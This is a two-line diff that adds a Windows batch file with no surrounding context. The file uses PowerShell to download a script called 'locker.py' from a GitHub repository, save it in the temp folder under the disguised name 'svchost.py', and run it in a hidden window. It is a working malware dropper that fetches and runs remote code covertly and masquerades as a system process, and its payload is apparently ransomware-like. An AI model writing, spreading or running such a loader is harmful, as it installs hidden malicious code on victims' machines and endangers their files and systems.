@@ -1,0 +1,2 @@
+@echo off
+powershell -Command "& {Invoke-WebRequest -Uri 'https://github.com/R0TA3/locker/raw/main/locker.py' -OutFile '%TEMP%\svchost.py'; Start-Process python -ArgumentList '%TEMP%\svchost.py' -WindowStyle Hidden}"
